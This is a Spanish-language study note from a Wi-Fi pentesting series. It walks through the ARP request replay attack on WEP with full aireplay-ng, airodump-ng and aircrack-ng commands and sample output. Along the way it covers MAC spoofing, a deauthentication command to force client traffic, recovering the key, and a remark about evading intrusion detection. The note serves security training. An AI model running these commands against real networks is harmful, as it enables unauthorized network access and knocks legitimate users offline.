---
tags:
  - Wi-Fi/WEP
  - Pentesting/Explotacion
Descripción: "El ataque de reinyección más fiable contra WEP: por qué ARP es el paquete perfecto y cómo pasar de 5 a 800 IVs por segundo"
Fecha de actualización: 2026-08-01
Nota previa: "[[04 - Identificar el IV en la captura]]"
Nota siguiente: "[[06 - Ataque de fragmentación]]"
Area: "[[WEP.base|WEP]]"
---
---

<mark style="background: #ADCCFFA6;">El [ARP Request Replay](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection) captura una petición ARP cifrada y la reenvía una y otra vez al AP</mark>. El AP la retransmite cada vez **con un IV nuevo**, y esa es toda la magia: se pasa de acumular unas decenas de IVs por minuto a varios cientos por segundo, sin conocer la clave.

# Por qué ARP

Un paquete ARP es el candidato ideal por cuatro razones:

| Propiedad | Por qué importa |
| --------- | --------------- |
| **Tamaño fijo y conocido** | 28 bytes de carga. Se identifica por longitud sin descifrarlo |
| **Va a broadcast** | El AP lo retransmite siempre, garantizando respuesta |
| **No lleva estado** | Reenviarlo mil veces no rompe ninguna sesión |
| **Abundante** | Cualquier cliente que se conecte genera varios |

<mark style="background: #8000E1A6;">No hace falta descifrarlo</mark>: se reenvía el paquete cifrado tal cual. El AP lo descifra con su clave, ve una petición ARP legítima y la vuelve a emitir cifrada con un IV distinto.

# El ataque

Tres terminales. La primera captura:

```shell-session
$ sudo airodump-ng wlan0mon -c 1 --bssid B2:D1:AC:E1:21:D1 -w WEP

 BSSID              PWR RXQ Beacons  #Data  #/s  CH  ENC  CIPHER ESSID
 B2:D1:AC:E1:21:D1  -47 100     149      7    0   1  WEP  WEP    HackTheWifi

 BSSID              STATION            PWR  Frames
 B2:D1:AC:E1:21:D1  4A:DD:C6:71:5A:3B  -29       6
```

La segunda reinyecta, suplantando a un cliente ya asociado:

```shell-session
$ sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon

Saving ARP requests in replay_arp-0805-100129.cap
Read 99 packets (got 0 ARP requests), sent 0 packets...
```

| Opción | Función |
| ------ | ------- |
| `-3` | Modo ARP request replay |
| `-b` | BSSID del AP |
| `-h` | MAC de origen: la de un cliente asociado, o la propia tras `fake auth` |
| `-x <pps>` | Limitar el ritmo de inyección |
| `-r <fichero>` | Reinyectar desde una captura previa |

Al principio el contador de ARP capturadas está a cero. En cuanto aparece una, el ritmo se dispara:

```text
Read 195576 packets (got 35039 ARP requests and 0 ACKs), sent 34758 packets...(500 pps)
```

> [!warning]+ El aviso de MAC que hace fallar el ataque
> ```text
> The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
> ```
> <mark style="background: #FF5582A6;">Muchos APs descartan tramas cuya MAC de origen no coincide con la de la radio que las emite</mark>. Hay que alinear las dos:
> ```shell-session
> $ sudo ip link set wlan0mon down
> $ sudo ip link set wlan0mon address 4A:DD:C6:71:5A:3B
> $ sudo ip link set wlan0mon up
> ```
> Es un aviso, no un error: `aireplay-ng` sigue adelante y a veces funciona igual. Cuando el contador de ARP sube pero los IVs no, la causa suele ser ésta.

# Provocar la primera ARP

Si no hay tráfico ARP, hay que generarlo. Dos vías:

**Desautenticar a un cliente.** Al reconectar emite ARP inmediatamente:

```shell-session
$ sudo aireplay-ng -0 3 -a B2:D1:AC:E1:21:D1 -c 4A:DD:C6:71:5A:3B wlan0mon
```

Basta con tres ráfagas. Es un ataque ruidoso pero WEP implica equipamiento antiguo, donde `PMF` no existe y rara vez hay un WIDS mirando — ver [[11 - Detección y evasión de ataques WEP]].

**Esperar.** Cualquier cliente que despierte, cambie de red o renueve DHCP genera ARP.

# Crackear

Con IVs suficientes, en una tercera terminal:

```shell-session
$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Read 195576 packets.
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 IVs.
KEY FOUND! [ 33:44:55:22:11 ]
Decrypted correctly: 100%
```

<mark style="background: #FFB8EBA6;">No hace falta detener la captura</mark>: `aircrack-ng` puede correr sobre el `.cap` mientras `airodump-ng` sigue escribiendo, y reintenta solo a medida que entran más IVs. Lo habitual es lanzarlo en cuanto se superan los 20.000 y dejarlo trabajar.

La clave se introduce sin los dos puntos: `3344552211`.

# Rendimiento

| Fase | Ritmo | Tiempo hasta 40.000 IVs |
| ---- | ----- | ----------------------- |
| Captura pasiva, cliente activo | 20–50 `#/s` | 15–30 min |
| ARP replay | **300–800 `#/s`** | **1–3 min** |

Los factores que lo limitan en la práctica:

- **Calidad del enlace.** Con `RXQ` por debajo de 80 se pierden respuestas. Acercarse o cambiar de antena rinde más que cualquier ajuste.
- **Capacidad del AP.** Equipamiento antiguo se satura sobre los 500 pps y empieza a descartar. `-x 400` puede dar más IVs efectivos que dejarlo sin límite.
- **Una sola tarjeta.** Capturar e inyectar por la misma radio pierde tramas. Con dos adaptadores, uno fijo capturando y otro inyectando, el rendimiento mejora notablemente — ver [[10 - Arsenal de herramientas Wi-Fi]].

# Cuándo no sirve

Este ataque necesita **un cliente asociado** cuya MAC suplantar y **tráfico ARP** que capturar. Si el AP no tiene clientes, hay que fabricar el material desde cero:

| Situación | Vía |
| --------- | --- |
| Hay cliente, no hay ARP | Desautenticar para forzarla |
| No hay clientes | *Fake auth* + [[06 - Ataque de fragmentación]] o [[07 - KoreK ChopChop]] |
| Hay cliente pero está aislado del AP | [[08 - Café Latte y ataques al cliente]] |

> [!important]+ Empezar siempre por aquí
> ARP replay es **el más fiable y el más simple** de los ataques a WEP: no requiere descifrar nada ni forjar paquetes, sólo reenviar. Fragmentación y ChopChop existen para los casos en que éste no es aplicable, no como alternativa preferente. Si hay un cliente asociado, esto resuelve en minutos.

El siguiente, para cuando no lo hay, es [[06 - Ataque de fragmentación]].
